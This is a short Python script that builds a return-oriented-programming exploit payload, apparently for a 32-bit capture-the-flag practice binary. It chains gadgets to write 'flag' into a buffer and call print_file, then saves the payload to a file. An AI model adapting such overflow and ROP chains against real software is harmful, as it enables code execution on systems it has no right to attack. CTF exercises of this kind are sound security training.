#!/usr/bin/env python
from struct import *
from subprocess import call

# pack it in
def conv(num):
    return pack("<I", num)

flag = "flag"
padding = "A"*12
byte_pad = "AAAA"

#functions
exitfun = conv(0x80481d6)
print_file = conv(0x080481e6)

# gadgets:
popedi = conv(0x804831b)
eax_edx = conv(0x80481c3)   # les edx,[eax]; ret
pop = conv(0x8048319)  # pop ebx; pop esi; pop edi; ret

mov_to_eax = conv(0x804811d)+byte_pad*3  # dword ptr [esp + 0xc]; add esp, 0x10; pop ebx; ret;

dl_to_eax_ptr = conv(0x080480fe) # mov    BYTE PTR [eax],dl

# clear_edx = mov_to_eax les edx, ptr [eax]; ret;
inc_dx_store_eax_ptr = conv(0x080480fb)

# need "flag" to be stored to buffer_space
buffer_space = 0x8049760

# gets buffer address into eax "pop+flag*3+eax+exitfun+"H"*8+buffer_space"
f = mov_to_eax + conv(buffer_space) + byte_pad+dl_to_eax_ptr+inc_dx_store_eax_ptr*(ord("f")-1)
l = mov_to_eax + conv(buffer_space+1) + byte_pad+dl_to_eax_ptr+inc_dx_store_eax_ptr*6

# edx value is now to high, clear out edx = change eax to 0, move to edx
clear_edx = mov_to_eax + conv(buffer_space+4) + byte_pad+ eax_edx

a = mov_to_eax +conv(buffer_space+2)+byte_pad+dl_to_eax_ptr+inc_dx_store_eax_ptr*ord("a")
g = mov_to_eax + conv(buffer_space+3)+byte_pad+dl_to_eax_ptr+inc_dx_store_eax_ptr*6+pop+conv(0x0)*3
exploit = padding
exploit += f+l+clear_edx+a+g+print_file+exitfun+"\n"

# output to file
f = open("exploit", "w")
f.write(exploit)
f.close()
exit()

